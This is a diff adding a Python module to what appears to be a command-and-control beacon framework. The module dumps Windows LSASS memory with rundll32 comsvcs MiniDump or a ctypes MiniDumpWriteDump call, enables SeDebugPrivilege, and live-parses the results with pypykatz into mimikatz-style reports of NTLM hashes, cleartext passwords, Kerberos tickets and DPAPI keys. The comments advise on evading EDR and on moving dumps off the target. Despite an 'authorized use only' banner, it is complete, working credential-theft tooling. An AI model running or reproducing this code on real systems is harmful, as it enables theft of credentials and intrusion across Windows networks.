@@ -1,0 +1,569 @@
+"""LSASS process memory dumper.
+
+============================================================
+AUTHORIZED SECURITY TESTING / EDUCATION USE ONLY.
+============================================================
+
+This module produces a Windows minidump of the LSASS process. The resulting
+.dmp can be parsed off-target with pypykatz to recover:
+
+  * WDigest cleartext passwords (when WDigest credSSP is enabled)
+  * NTLM password hashes
+  * Kerberos TGT / TGS tickets
+  * LM hashes (when LM hash storage is enabled)
+  * DPAPI master keys (depending on dump completeness)
+  * Credential Manager credentials of the calling user
+
+This is the same capability mimikatz's ``sekurlsa::minidump`` provides. It is
+gated to Windows hosts and requires the beacon to be running with admin
+rights (SeDebugPrivilege) -- which on a non-admin host means it will fail
+loudly instead of silently.
+
+Two dump strategies are implemented:
+
+  1. ``comsvcs``  -- invoke ``rundll32 comsvcs.dll, MiniDump <pid> <out> full``.
+     The OS's own signed binary does the dump. This is what mimikatz uses
+     by default and what is least visible to EDR heuristics that watch for
+     dbghelp.dll loads.
+
+  2. ``ctypes``   -- load ``dbghelp.dll`` and call ``MiniDumpWriteDump``
+     directly. More flexible (any target process, custom flags) but
+     noisier; most EDRs flag dbghelp+MiniDumpWriteDump on lsass.exe.
+
+After dumping, transfer the file off-target (use ``upload`` + ``download``
+or the operator-side ``scp``). Parse on the operator host:
+
+    python3 -m pypykatz lsadump lsass.dmp
+    # or
+    cscli --parse-lsass lsass.dmp
+
+Reference: ATT&CK T1003.001 (OS Credential Dumping: LSASS Memory).
+"""
+import os
+import shutil
+import subprocess
+import sys
+
+
+# ---------------------------------------------------------------------------
+# Helpers
+# ---------------------------------------------------------------------------
+def _is_windows():
+    return os.name == "nt"
+
+
+def _resolve_lsass_pid():
+    """Find lsass.exe PID via tasklist (no WMI / pywin32 dependency)."""
+    if not _is_windows():
+        return None
+    try:
+        out = subprocess.run(
+            ["tasklist", "/FI", "IMAGENAME eq lsass.exe", "/NH", "/FO", "CSV"],
+            capture_output=True, text=True, timeout=10).stdout
+    except Exception:
+        return None
+    for line in out.splitlines():
+        parts = [p.strip().strip('"') for p in line.split(",")]
+        if len(parts) >= 2 and parts[0].lower() == "lsass.exe":
+            try:
+                return int(parts[1])
+            except ValueError:
+                continue
+    return None
+
+
+# ---------------------------------------------------------------------------
+# Public API (mirrors cs/modules/*.py convention used by beacon.do_<cmd>)
+# ---------------------------------------------------------------------------
+def dump_lsass(out_path, prefer="comsvcs"):
+    """Dump LSASS process memory to a minidump file.
+
+    Args:
+        out_path: target path on the beacon host (absolute or relative to
+                  beacon's cwd). File must be on a writable volume.
+        prefer:   "comsvcs" (default; uses rundll32 + the OS-signed
+                  comsvcs.dll MiniDump export) or "ctypes" (direct
+                  MiniDumpWriteDump via dbghelp.dll).
+
+    Returns:
+        (ok, message) -- message is the path on success, or an error string.
+    """
+    if not _is_windows():
+        return False, "lsass dump only runs on Windows hosts"
+
+    pid = _resolve_lsass_pid()
+    if pid is None:
+        return False, "could not locate lsass.exe (is the host Windows?)"
+
+    out_path = os.path.abspath(out_path)
+    try:
+        parent = os.path.dirname(out_path) or "."
+        if not os.path.isdir(parent):
+            os.makedirs(parent, exist_ok=True)
+    except OSError:
+        pass
+
+    if prefer == "comsvcs":
+        return _dump_via_comsvcs(pid, out_path)
+    if prefer == "ctypes":
+        return _dump_via_ctypes(pid, out_path)
+    return False, f"unknown prefer={prefer!r}; use 'comsvcs' or 'ctypes'"
+
+
+def parse_dump(dmp_path):
+    """Parse an LSASS minidump file with pypykatz. Operator-side utility.
+
+    pypykatz is an optional dependency. If it's not importable, we surface
+    a clean error rather than crash, so the beacon can still produce the
+    .dmp and the operator can parse it on a host that has pypykatz.
+
+    The DumpFile is parsed with ``apypykatz.parse_minidump_file`` (which is
+    async — we drive it with ``asyncio.run``). This runs from either the
+    operator host or a PyInstaller-built beacon that bundles pypykatz.
+
+    Returns:
+        (ok, text_report)
+        The report includes the parsed credential types (not the decoded
+        secrets) — a grep-friendly summary intended to confirm the dump is
+        parseable before you pull it off-target and do a full decode.
+    """
+    try:
+        from pypykatz.apypykatz import apypykatz
+    except ImportError:
+        return False, ("pypykatz not installed. Run on the operator host:\n"
+                       "    pip install pypykatz\n"
+                       "    python3 -m pypykatz lsadump <file>\n"
+                       "or:  cscli parse-lsass <file>  (if pypykatz is on PATH)")
+    if not os.path.exists(dmp_path):
+        return False, f"dump file not found: {dmp_path}"
+    try:
+        import asyncio
+        katz = asyncio.run(apypykatz.parse_minidump_file(dmp_path))
+    except Exception as e:
+        import traceback
+        return False, f"pypykatz parse failed: {e}\n{traceback.format_exc(limit=3)}"
+
+    lines = []
+    for luid, sess in getattr(katz, "logon_sessions", {}).items():
+        uname = sess.username or "?"
+        dom = sess.domainname or "?"
+        lines.append(f"== {dom}\\{uname}  (luid={luid}) ==")
+        for ssp, attr in (
+            ("msv", "msv_creds"), ("wdigest", "wdigest_creds"),
+            ("kerberos", "kerberos_creds"), ("tspkg", "tspkg_creds"),
+            ("ssp", "ssp_creds"), ("livessp", "livessp_creds"),
+            ("dpapi", "dpapi_creds"), ("cloudap", "cloudap_creds"),
+        ):
+            creds = getattr(sess, attr, [])
+            if creds:
+                lines.append(f"  {ssp}: {len(creds)} principal(s)")
+        lines.append("")
+    if not lines:
+        lines = ["(no logon sessions found in dump)"]
+    return True, "\n".join(lines)
+
+
+# ---------------------------------------------------------------------------
+# sekurlsa::logonpasswords  --  live LSASS parsing, no dump file.
+#
+# This is mimikatz's sekurlsa::logonpasswords reimplemented in Python via
+# pypykatz. It opens the live lsass.exe process (PROCESS_ALL_ACCESS after
+# enabling SeDebugPrivilege), reads SSP memory regions directly via
+# VirtualQueryEx + ReadProcessMemory (all wrapped by pypykatz), and runs the
+# msv / wdigest / kerberos / tspkg / ssp / livessp / dpapi / cloudap
+# decryptors against that memory image. No .dmp file is written to disk --
+# the parsed credentials go straight back to the operator.
+#
+# IMPORTANT prerequisites:
+#   * Windows host
+#   * Python 64-bit on a 64-bit Windows, or 32-bit on 32-bit (pypykatz's
+#     sanity check enforces this -- you can't read 64-bit lsass from 32-bit
+#     python).
+#   * The beacon (or operator host) is a member of the local Administrators
+#     group. Without it, OpenProcess(lsass) returns ERROR_ACCESS_DENIED.
+#   * LSASS must NOT be running as a Protected Process Light (PPL) target.
+#     On Win 11 22H2+ with Credential Guard enabled, you must first
+#     disable Credential Guard (group policy / registry) or use a kernel
+#     driver to strip the protection -- out of scope here.
+#
+# The beacon payload generated by `cscli --payload` is stdlib-only and does
+# NOT bundle pypykatz; sekurlsa will return "pypykatz not importable" from
+# such a payload. Build a PyInstaller beacon (`./scripts/build-binary.sh`)
+# on a host where pypykatz is installed to get a self-contained binary that
+# can run sekurlsa against itself.
+# ---------------------------------------------------------------------------
+def sekurlsa_logonpasswords(packages="all", pid=None, no_lsa=False):
+    """Live-parse LSASS SSPs in-memory. Returns (ok, text_report).
+
+    Args:
+        packages:  list / tuple / comma string of which SSPs to parse.
+                   Defaults to "all" (= msv, wdigest, kerberos, tspkg, ssp,
+                   livessp, dpapi, cloudap). Pass a subset to skip slow ones.
+        pid:       target PID. If None, auto-resolve "lsass.exe".
+        no_lsa:    if True, skip the LSA template / decryption key step.
+                   Faster but you lose the decryption keys needed for
+                   WDigest / Kerberos / TSPKG / SSP / LiveSSP cleartext.
+                   Only MSV (NT/LM hashes) survives.
+    """
+    if not _is_windows():
+        return False, "sekurlsa::logonpasswords only runs on Windows hosts"
+
+    if isinstance(packages, str):
+        pkgs = [p.strip() for p in packages.split(",") if p.strip()]
+    else:
+        pkgs = list(packages)
+    if not pkgs:
+        pkgs = ["all"]
+
+    try:
+        # pypykatz internals: the bundled `pypykatz live` CLI is a stub in
+        # 0.6.13, but the underlying LiveReader + apypykatz components work
+        # and that's the documented way to drive live parsing.
+        from pypykatz.commons.readers.local.live_reader import LiveReader
+        from pypykatz.commons.common import KatzSystemInfo
+        from pypykatz.apypykatz import apypykatz
+    except ImportError as e:
+        return False, (f"pypykatz not importable in this Python environment "
+                       f"({e}).\n"
+                       "  On the operator host:  pip install pypykatz\n"
+                       "  On a beacon host:      rebuild the PyInstaller "
+                       "binary on a host with pypykatz installed:\n"
+                       "      pip install pypykatz\n"
+                       "      ./scripts/build-binary.sh windows64")
+
+    # LiveReader.setup() will:
+    #   * enable_debug_privilege()  -> enable SeDebugPrivilege
+    #   * OpenProcess(PROCESS_ALL_ACCESS) on the target
+    #   * EnumProcessModules + GetModuleFileNameExW -> enumerate lsass modules
+    #   * VirtualQueryEx over the full address space -> enumerate pages
+    # All of that raises on a non-admin host or on a PPL-protected lsass.
+    try:
+        if pid is not None:
+            lr = LiveReader(process_pid=int(pid))
+        else:
+            lr = LiveReader(process_name="lsass.exe")
+    except Exception as e:
+        return False, f"LiveReader setup failed (need admin; LSASS may be PPL): {e}"
+
+    try:
+        sysinfo = KatzSystemInfo.from_live_reader(lr)
+    except Exception as e:
+        return False, f"sysinfo build failed: {e}"
+
+    reader = lr.get_buffered_reader()
+
+    # apypykatz.start() is async (pypykatz uses asyncio internally).
+    # Drive it from sync code with asyncio.run().
+    import asyncio
+    mimi = apypykatz(reader, sysinfo)
+    try:
+        if no_lsa:
+            # Skip LSA decryptor: MSV (NT/LM hash) survives, but WDigest /
+            # Kerberos / SSP / LiveSSP / TSPKG cleartext needs the LSA
+            # session key which we won't have.
+            asyncio.run(mimi.get_logoncreds())
+        else:
+            asyncio.run(mimi.start(pkgs))
+    except Exception as e:
+        return False, f"apypykatz.start failed: {e}"
+
+    return True, format_sekurlsa(mimi)
+
+
+def format_sekurlsa(mimi):
+    """Render an apypykatz result in mimikatz sekurlsa::logonpasswords style.
+
+    Output mirrors the visual style of `mimikatz sekurlsa::logonpasswords`
+    so operators used to mimikatz get a familiar report:
+
+        Authentication Id : 0;996
+        Session           : Service
+        User Name         : svc_sql
+        Domain            : CONTOSO
+        Logon Server      : DC01
+        Logon Time        : 1/15/2025 10:30:45
+        SID               : S-1-5-...
+
+                msv :
+                 [00000003] Primary
+                 * Username : svc_sql
+                 * Domain   : CONTOSO
+                 * NTLM     : aad3b...
+
+                wdigest :
+                 * Username : svc_sql
+                 * Password : (null)
+
+                kerberos :
+                 * Username : svc_sql
+                 ...
+    """
+    import datetime as _dt
+    out = ["sekurlsa::logonpasswords", "=" * 60]
+
+    if not mimi.logon_sessions:
+        out.append("(no active logon sessions found in lsass memory)")
+
+    for luid, sess in mimi.logon_sessions.items():
+        auth_id = sess.authentication_id or luid
+        try:
+            auth_id_str = f"{auth_id};{int(luid):x}" if luid else str(auth_id)
+        except (ValueError, TypeError):
+            auth_id_str = str(auth_id)
+        logon_time = sess.logon_time
+        if isinstance(logon_time, _dt.datetime):
+            logon_time = logon_time.strftime("%Y-%m-%d %H:%M:%S")
+        elif logon_time is None:
+            logon_time = "(unknown)"
+
+        out.append("")
+        out.append(f"Authentication Id : {auth_id_str}")
+        out.append(f"Session           : {sess.session_id or '(unknown)'}")
+        out.append(f"User Name         : {sess.username or '(unknown)'}")
+        out.append(f"Domain            : {sess.domainname or '(unknown)'}")
+        out.append(f"Logon Server      : {sess.logon_server or '(unknown)'}")
+        out.append(f"Logon Time        : {logon_time}")
+        out.append(f"SID               : {sess.sid or '(unknown)'}")
+        out.append("")
+        # Each SSP block.
+        for ssp_name, creds_attr in (
+            ("msv",      "msv_creds"),
+            ("wdigest",  "wdigest_creds"),
+            ("kerberos", "kerberos_creds"),
+            ("tspkg",    "tspkg_creds"),
+            ("ssp",      "ssp_creds"),
+            ("livessp",  "livessp_creds"),
+            ("dpapi",    "dpapi_creds"),
+            ("cloudap",  "cloudap_creds"),
+            ("credman",  "credman_creds"),
+        ):
+            creds = getattr(sess, creds_attr, [])
+            if not creds:
+                continue
+            out.append(f"\t{ssp_name} :")
+            for c in creds:
+                d = c.to_dict() if hasattr(c, "to_dict") else {}
+                if ssp_name == "msv":
+                    out.append(f"\t [{d.get('credtype') or 'Primary'}]")
+                _emit_msv(out, d) if ssp_name == "msv" else _emit_kv(out, d)
+                out.append("")
+        out.append("")
+
+    if mimi.orphaned_creds:
+        out.append("== Orphaned credentials ==")
+        for cred in mimi.orphaned_creds:
+            d = cred.to_dict() if hasattr(cred, "to_dict") else {}
+            out.append(f"  [{d.get('credtype', '?')}] "
+                       f"{d.get('domainname', '?')}\\{d.get('username', '?')}")
+            for k, v in d.items():
+                if k in ("credtype", "username", "domainname"):
+                    continue
+                if v not in (None, "", b""):
+                    out.append(f"      {k}: {v}")
+        out.append("")
+
+    if mimi.errors:
+        out.append("== Errors ==")
+        for pkg, err in mimi.errors:
+            out.append(f"  [{pkg}] {err}")
+        out.append("")
+
+    return "\n".join(out)
+
+
+def _emit_kv(lines, d):
+    """Render a credential dict as '* key : value' lines, skipping blanks."""
+    d2 = dict(d)
+    d2.pop("credtype", None)
+    label_map = {
+        "username":       "Username",
+        "domainname":     "Domain",
+        "password":       "Password",
+        "NThash":         "NTLM",
+        "LMHash":         "LM",
+        "SHAHash":        "SHA1",
+        "DPAPI":          "DPAPI",
+        "masterkey":      "MasterKey",
+        "sha1_masterkey": "SHA1 MasterKey",
+        "key_guid":       "Key GUID",
+    }
+    for k, v in d2.items():
+        if v in (None, "", b"", []):
+            continue
+        lines.append(f"\t * {label_map.get(k, k):14s}: {v}")
+
+
+def _emit_msv(lines, d):
+    """Special-case MSV creds to surface NT/LM/SHA1 hashes first."""
+    order = ["username", "domainname", "LMHash", "NThash", "SHAHash",
+             "DPAPI", "isoProt"]
+    d2 = dict(d)
+    d2.pop("credtype", None)   # already shown in the [credtype] header line
+    label_map = {
+        "username":   "Username",
+        "domainname": "Domain",
+        "LMHash":     "LM",
+        "NThash":     "NTLM",
+        "SHAHash":    "SHA1",
+        "DPAPI":      "DPAPI",
+        "isoProt":    "ISO Prot",
+    }
+    for k in order:
+        if k in d2 and d2[k] not in (None, "", b""):
+            lines.append(f"\t * {label_map[k]:14s}: {d2[k]}")
+            del d2[k]
+    for k, v in d2.items():
+        if v not in (None, "", b""):
+            lines.append(f"\t * {k:14s}: {v}")
+
+
+# ---------------------------------------------------------------------------
+# Strategy 1: comsvcs!MiniDump via rundll32
+# ---------------------------------------------------------------------------
+def _dump_via_comsvcs(pid, out_path):
+    """rundll32 comsvcs.dll, MiniDump <pid> <out.dmp> full.
+
+    comsvcs.dll ships with every modern Windows install and is signed by MS,
+    so this avoids loading dbghelp into the beacon process. The beacon's
+    current token must have PROCESS_QUERY_INFORMATION on lsass -- which a
+    member of the local Administrators group does (because LSASS grants
+    Administrators full access by default).
+    """
+    system_root = os.environ.get("SystemRoot", r"C:\Windows")
+    comsvcs = os.path.join(system_root, "System32", "comsvcs.dll")
+    if not os.path.exists(comsvcs):
+        return False, f"comsvcs.dll not found at {comsvcs}"
+
+    # rundll32 takes args after a comma: rundll32 <dll>,<entry> <args...>
+    # MiniDump signature:  MiniDump(DWORD pid, LPCWSTR file, DWORD flags)
+    cmd = ["rundll32.exe", comsvcs, "MiniDump", str(pid), out_path, "full"]
+    try:
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+    except subprocess.TimeoutExpired:
+        return False, "comsvcs MiniDump timed out (>120s)"
+
+    if not os.path.exists(out_path):
+        return False, ("MiniDump did not produce output file. "
+                       "rc=" + str(r.returncode) +
+                       (" stderr=" + (r.stderr or "").strip() if r.stderr else ""))
+    return True, out_path
+
+
+# ---------------------------------------------------------------------------
+# Strategy 2: direct MiniDumpWriteDump via ctypes
+# ---------------------------------------------------------------------------
+def _dump_via_ctypes(pid, out_path):
+    """Load dbghelp.dll and call MiniDumpWriteDump(pid, pid, hFile,
+    MiniDumpWithFullMemory, ...).
+
+    Requires SeDebugPrivilege on the current process token. We enable it
+    best-effort; if it can't be enabled (non-admin host), the OpenProcess
+    call will fail with ERROR_ACCESS_DENIED.
+    """
+    if not _enable_se_debug():
+        return False, "failed to enable SeDebugPrivilege (run as admin)"
+
+    import ctypes
+    from ctypes import wintypes as wt
+
+    kernel32 = ctypes.WinDLL("kernel32.dll")
+    dbghelp = ctypes.WinDLL("dbghelp.dll")
+
+    MiniDumpWriteDump = dbghelp.MiniDumpWriteDump
+    MiniDumpWriteDump.argtypes = [
+        wt.DWORD, wt.DWORD, ctypes.c_void_p, wt.DWORD, ctypes.c_void_p,
+        ctypes.c_void_p, ctypes.c_void_p,
+    ]
+    MiniDumpWriteDump.restype = wt.BOOL
+
+    # OpenProcess access: VM_READ + QUERY_INFORMATION + QUERY_LIMITED
+    access = 0x0010 | 0x0400 | 0x1000   # VM_READ | QUERY_INFORMATION | QUERY_LIMITED
+    hProc = kernel32.OpenProcess(access, False, pid)
+    if not hProc:
+        return False, (f"OpenProcess(lsass pid={pid}) failed: "
+                       f"err={ctypes.get_last_error()} (need admin / SeDebugPrivilege)")
+
+    GENERIC_WRITE = 0x40000000
+    CREATE_ALWAYS = 2
+    FILE_ATTRIBUTE_NORMAL = 0x80
+    INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value
+
+    hFile = kernel32.CreateFileW(out_path, GENERIC_WRITE, 0, None,
+                                 CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)
+    if not hFile or hFile == INVALID_HANDLE_VALUE:
+        err = ctypes.get_last_error()
+        kernel32.CloseHandle(hProc)
+        return False, f"CreateFileW({out_path}) failed: err={err}"
+
+    try:
+        # MiniDumpWithFullMemory = 0x00000002 (also pulls hidden protected
+        # process memory; what mimikatz uses by default)
+        ok = MiniDumpWriteDump(pid, pid, hFile, 0x00000002, None, None, None)
+        if not ok:
+            return False, (f"MiniDumpWriteDump failed: err={ctypes.get_last_error()} "
+                           f"(often means an AV/EDR blocked the handle)")
+    finally:
+        kernel32.CloseHandle(hFile)
+        kernel32.CloseHandle(hProc)
+
+    if not os.path.exists(out_path):
+        return False, "MiniDumpWriteDump returned ok but no file was produced"
+    return True, out_path
+
+
+def _enable_se_debug():
+    """Best-effort: enable SeDebugPrivilege on the current process token.
+
+    Returns True if the privilege is now enabled. Returns False on non-admin
+    hosts (the typical case where OpenProcess on lsass later fails).
+    """
+    try:
+        import ctypes
+        from ctypes import wintypes as wt
+    except Exception:
+        return False
+
+    advapi32 = ctypes.WinDLL("advapi32.dll")
+    kernel32 = ctypes.WinDLL("kernel32.dll")
+
+    class LUID(ctypes.Structure):
+        _fields_ = [("LowPart", wt.DWORD), ("HighPart", wt.LONG)]
+
+    class LUID_AND_ATTRIBUTES(ctypes.Structure):
+        _fields_ = [("Luid", LUID), ("Attributes", wt.DWORD)]
+
+    class TOKEN_PRIVILEGES(ctypes.Structure):
+        _fields_ = [("PrivilegeCount", wt.DWORD),
+                    ("Privileges", LUID_AND_ATTRIBUTES * 1)]
+
+    TOKEN_ADJUST_PRIVILEGES = 0x0020
+    TOKEN_QUERY = 0x0008
+    SE_PRIVILEGE_ENABLED = 0x02
+
+    hToken = wt.HANDLE()
+    if not kernel32.OpenProcessToken(kernel32.GetCurrentProcess(),
+                                     TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+                                     ctypes.byref(hToken)):
+        return False
+
+    luid = LUID()
+    if not advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege",
+                                          ctypes.byref(luid)):
+        kernel32.CloseHandle(hToken)
+        return False
+
+    tp = TOKEN_PRIVILEGES()
+    tp.PrivilegeCount = 1
+    tp.Privileges[0].Luid = luid
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+
+    AdjustTokenPrivileges = advapi32.AdjustTokenPrivileges
+    AdjustTokenPrivileges.argtypes = [wt.HANDLE, wt.BOOL, ctypes.c_void_p,
+                                      wt.DWORD, ctypes.c_void_p, ctypes.c_void_p]
+    AdjustTokenPrivileges.restype = wt.BOOL
+
+    ok = AdjustTokenPrivileges(hToken, False, ctypes.byref(tp),
+                               0, None, None)
+    err = ctypes.get_last_error()
+    kernel32.CloseHandle(hToken)
+    return bool(ok) and err == 0
